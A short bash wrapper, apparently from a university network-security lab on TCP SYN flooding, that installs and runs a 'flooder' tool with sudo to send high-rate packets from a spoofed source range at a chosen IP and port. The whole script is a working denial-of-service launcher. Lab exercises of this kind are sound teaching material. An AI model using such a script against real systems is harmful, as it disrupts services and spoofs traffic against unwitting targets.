#!/bin/bash

if [ "$#" -ne 6 ];then
    echo "Usage: ./flood.sh <source_ip> <netmask> <destination_ip> <destination_port> <protocol> <highrate>";
    exit 0
fi

source=$1
netmask=$2
destination_ip=$3
destination_port=$4
protocol=$5
highrate=$6

if ! which flooder &> /dev/null
then
    echo "Flooder is not installed. Installing now..."
    /share/education/TCPSYNFlood_USC_ISI/install-flooder
fi

sudo flooder --dst $destination_ip --highrate $highrate --dportmin $destination_port --dportmax $destination_port --proto $protocol --src $source --srcmask $netmask